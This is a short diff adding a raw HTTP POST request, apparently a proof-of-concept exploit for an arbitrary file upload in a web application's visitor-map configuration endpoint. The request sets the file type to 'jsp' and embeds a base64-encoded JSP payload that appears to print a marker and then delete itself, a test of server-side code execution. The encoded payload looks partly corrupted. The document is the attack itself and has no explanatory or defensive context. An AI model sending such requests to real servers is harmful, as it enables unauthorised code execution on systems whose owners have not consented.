@@ -1,0 +1,4 @@
+POST /manage/visitorMapConfig/updateVisitorMapConfig.do?recoToken=SGUsqvF7cVS HTTP/1.1
+Host: 
+
+{"id":1,"mapName":"25bdaf","fileType":"jsp","updatedPhoto":"PCUgb3V0LnByaW50bG4oInBib31qb,5yZmlwbXBsc3VrZGVjenVkc2VmeG15d2UiKTsgbmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFN1cnZsZXBQYXRoKCkpKS5kZWxldGUoKTsgJT4"}
